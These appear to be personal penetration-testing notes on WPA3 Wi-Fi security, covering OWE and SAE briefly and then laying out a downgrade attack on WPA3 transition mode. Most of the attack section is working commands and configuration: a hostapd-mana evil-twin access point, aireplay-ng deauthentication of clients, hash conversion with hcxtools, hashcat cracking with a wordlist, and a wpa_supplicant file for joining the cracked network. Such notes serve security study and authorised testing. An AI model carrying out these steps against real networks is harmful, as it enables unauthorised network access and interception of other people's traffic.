With OWE on WPA3 you get encryption with an open network using Dephie Helman which protects data on open networks:
- Authentication
- Association  DH exchange
- Then 4 way handshake

Encrypted WPA3 Networks: 
These use zero knowlege proofs to protect the authentication exchange and to mutually verifify both parties without knowing all the information. 
This allows both parties to know that they each posess the password without passing secrets over a handshake

This is susceptible to MITM due to not validating access points.. 



------------------
Downgrade Attack: 
------------------
If WPA transition mode is enabled it will allow non WPA3-SAE devices  to connect using WPA2-PSK, we can use this in a downgrade attack of normal 4-way handshakes. 

You can look at a beacon frame in the Auth Key Management field it will list both SAE and PSK
	1. If the AP supports WPA2-PSK and WPA3 you can wait for a WPA2 only supported user and capture their handshake. Check RSN element of beacon frame for both PSK and SAE presence. 
	2. Create a WPA2-PSK honypot AP with the same SSID and bad password similar to the AP-Less attack, wait/force client to connect and then capture the 4-way handshake
	3. Then Crack the Handshake as normal

Note: This would be similar attack setup to the WPA-AP-Less Attack. 

1. Setup a hostapd file: 
----------------------------
#file:hostapd.conf

interface=wlan0
driver=nl80211
hw_mode=g
channel=<11>
ssid=<TargetSSID>
mana_wpaout=hostapd-output.hccapx
wpa=2
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP CCMP
wpa_passphrase=12345678

2. Launch an attack with hostapd-mana
-------------------------------------
hostapd-mana hostapd.conf

3. Deauth Client: Now if protected managment frames are not turned on Deauth a client: 
aireplay-ng wlan0 -0 0 -a <BSSID>  -c <ClientMAC>

4. Convert the hash: 
hcxhash2cap --hccapx=hostapd-output.hccapx -c output.pcap
hcxpcapngtool output.pcap -o hash.22000

5. Crack the hash: 
hashcat -a 0 -m 22000 hash.22000 <rockyou.txt> --force


You can then connect to the network with the following WPA_Supplicant file: 
#myconfig.conf

network={
  ssid="SSiD"
  psk="password"
  key_mgmt=SAE
  scan_ssid=1
  ieee80211w=1
}

wpa_supplicant -i wlan0 -c myconfig.conf
